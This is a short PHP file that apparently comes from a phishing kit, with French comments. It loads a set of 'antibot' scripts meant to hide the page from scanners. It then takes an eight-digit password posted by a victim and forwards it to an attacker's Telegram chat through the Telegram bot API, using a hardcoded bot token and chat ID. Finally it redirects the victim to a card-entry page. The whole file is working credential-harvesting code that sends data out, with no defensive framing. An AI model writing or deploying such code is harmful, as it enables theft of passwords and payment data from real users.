<?php
include '../src/antibots.php';
include '../antibots.php';
include '../anti/anti1.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti7.php';
include '../anti/anti8.php';



if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['password'];

    if (strlen($password) !== 8 || !is_numeric($password)) {
        die('Mot de passe invalide.');
    }

    // Vos informations Telegram
    $botToken = "8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ";
    $chatID = "8134069302";
    $message = "Mot de passe reçu : $password";

    // URL de l'API Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Envoi du message
    $response = file_get_contents($url . "?chat_id=$chatID&text=" . urlencode($message));

    // Vérification de la réponse
    if ($response) {
        header("Location: ../carte.php");
    } else {
        header("Location: ../password.php");
    exit;;
    }
}
?>
